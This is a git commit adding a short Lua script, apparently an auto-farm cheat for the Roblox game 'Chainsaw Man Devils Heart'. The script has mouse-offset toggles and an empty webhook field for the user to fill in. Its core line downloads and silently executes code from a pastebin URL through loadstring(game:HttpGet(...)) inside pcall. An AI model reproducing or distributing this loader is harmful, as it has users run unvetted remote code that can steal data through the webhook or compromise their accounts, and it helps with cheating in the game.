9c73f85ad0a658567e9dd0859568fe769d17ab60
Emil Toth <emiltoth1870@gmail.com>
2023-03-07 21:41:03 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Chainsaw Man Devils Heart Heart Farm.lua
@@ -0,0 +1,7 @@
+_G.toggle = true
+_G.left = 500 -- increase to move mouse right
+_G.right = 300 -- increase to move mouse down
+local Webhook = ' ' -- add ur webhook
+pcall(function()
+  loadstring(game:HttpGet('https://pastebin.com/raw/Bf1ditke'))()
+end)
